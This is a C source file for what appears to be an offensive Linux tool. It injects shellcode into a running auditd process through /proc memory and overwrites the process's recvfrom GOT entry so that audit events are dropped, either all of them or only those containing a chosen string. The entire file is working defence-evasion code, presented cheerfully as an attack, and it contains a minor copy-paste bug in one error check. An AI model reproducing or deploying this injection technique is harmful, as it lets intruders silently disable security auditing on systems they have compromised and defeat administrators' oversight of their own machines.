#include "../include/utils.h"
#include "../include/procmem.h"
#include "../include/shellcode.h"

const char* libc = "libc.so.6";
const char* hook = "recvfrom";

long long hook_placeholder = 0xfffffffffffa;

#ifndef FILTER_ALL
long long matcher_pattern = 0xffffffffff01;
long long strstr_placeholder = 0xfffffffffffb;
long long strtoul_placeholder = 0xfffffffffffc;
#endif

int main(int argc, char** argv)
{
#ifdef FILTER_ALL
    if (argc != 2)
    {
        printf("Usage: %s <PID>\n", argv[0]);
        return 0;
    }
#else
    if (argc != 3)
    {
        printf("Usage: %s <PID> <HIDE-STR>\n", argv[0]);
        return 0;
    }

    const char* matcher_str = argv[2];
#endif

    pid_t pid = (pid_t)atoi(argv[1]);
    long long data_seg = get_addr(pid, "libaudit.so", "r--p", 2);

    if (data_seg == 0)
    {
        printf("[-] Unable to find data segment of %d\n", pid);
        return 1;
    }

    printf("[+] Found data segment of %d at %p\n", pid, data_seg);
    long long libc_base = get_addr(pid, libc, "r-xp", 0);

    if (libc_base == 0)
    {
        printf("[-] Unable to find libc in %d\n", pid);
        return 1;
    }

    printf("[+] Found libc base address of %d at %p\n", pid, libc_base);
    long offset = get_func_offset(libc, hook);

    if (offset == 0)
    {
        printf("[-] Unable to offset of %s in %s\n", hook, libc);
        return 1;
    }

    printf("[+] Found offset of '%s' in libc at %lx\n", hook, offset);
    long long pattern = libc_base + offset;

    printf("[+] Searching for pattern 0x%llx in data segment of %d\n", pattern, pid);
    long size = get_size(pid, "r--p", NULL, 2);

    if (size == 0)
    {
        printf("[-] Unable to obtain data segment size of %d\n", pid);
        return 1;
    }

    printf("[+] Data segment is %llx bytes long.\n", size);
    int procmem = procmem_open(pid);

    char* mem = read_mem(procmem, data_seg, size);
    long result = search(mem, size, pattern);

    if (result == 0)
    {
        printf("[-] Function '%s' was not found in GOT of %d.\n", hook, pid);
        return 1;
    }

    long hook_addr = result + data_seg;
    printf("[+] Found '%s' in %d at 0x%llx\n", hook, pid, hook_addr);

    /*
     * Replace dummy values for recvfrom, strstr and strtoul with their
     * corresponding values in the remote libc. strstr and strtoul are
     * only required if we want to perform selective filtering.
     */
    printf("[+] Preparing shellcode...\n");

    char* shellcode_copy = (char*)malloc(shellcode_size);
    memcpy(shellcode_copy, shellcode, shellcode_size);

    int count = replace_long_long(shellcode_copy, shellcode_size, hook_placeholder, pattern);
    printf("[+] Replaced %d occurences of %s.\n", count, hook);

#ifndef FILTER_ALL
    long long addr_strstr = get_func_offset(libc, "strstr") + libc_base;
    if (addr_strstr == 0)
    {
        printf("[-] Unable to find strstr in %s\n", libc);
        return 1;
    }

    printf("[+] Found strstr in %d at 0x%llx\n", pid, addr_strstr);

    count = replace_long_long(shellcode_copy, shellcode_size, strstr_placeholder, addr_strstr);
    printf("[+] Replaced %d occurences of strstr.\n", count);

    long long addr_strtoul = get_func_offset(libc, "strtoul") + libc_base;
    if (addr_strstr == 0)
    {
        printf("[-] Unable to find strtoul in %s\n", libc);
        return 1;
    }

    printf("[+] Found strtoul in %d at 0x%llx\n", pid, addr_strtoul);

    count = replace_long_long(shellcode_copy, shellcode_size, strtoul_placeholder, addr_strtoul);
    printf("[+] Replaced %d occurences of strtoul.\n", count);

    /*
     * Find a cave for the pattern matching string. This string need to be present in the remote
     * process and we need to insert a pointer to this string into our shellcode.
     */
    long long cave_matcher = find_code_cave(procmem, pid, strlen(matcher_str) + 0x20, "r--p");
    if (cave_matcher == 0)
    {
        printf("[-] Unable to find code cave in %d\n", pid);
        return 1;
    }

    printf("[+] Found code cave for pattern matching in %d at 0x%llx\n", pid, cave_matcher);
    printf("[+] Wrtiting '%s' to codecave.\n", matcher_str);

    write_mem(procmem, cave_matcher, matcher_str, strlen(matcher_str) + 1);

    count = replace_long_long(shellcode_copy, shellcode_size, matcher_pattern, cave_matcher);
    printf("[+] Replaced %d occurences of matcher pattern.\n", count);
#endif

    /*
     * Find a code cave for the shellcode. This cave needs to be executable.
     * Write our shellcode to the cave and replace the GOT entry of recvfrom
     * with a pointer to it.
     */
    printf("[+] Searching codecave for %d byte shellcode...\n", shellcode_size);

    long long cave = find_code_cave(procmem, pid, shellcode_size + 0x20, "r-xp");
    if (cave == 0)
    {
        printf("[-] Unable to find code cave in %d\n", pid);
        return 1;
    }

    printf("[+] Found code cave in %d at 0x%llx\n", pid, cave);
    printf("[+] Wrtiting shellcode to codecave.\n");

    write_mem(procmem, cave, shellcode_copy, shellcode_size);

    printf("[+] Replacing '%s' GOT entry with shellcode addr.\n", hook);
    write_mem(procmem, hook_addr, (char*)&cave, 6);

    /*
     * We are done. If auditd is still alive, we have probably patched it
     * successfully. Otherwise it probably segfaulted :D
     */

    sleep(3);

    if (kill(pid, 0) == 0)
    {
        printf("[+] auditd patched successfully.\n");
    }

    else
    {
        printf("[-] Seems like we killed auditd. Ooopsie :D\n");
    }

    close(procmem);
}
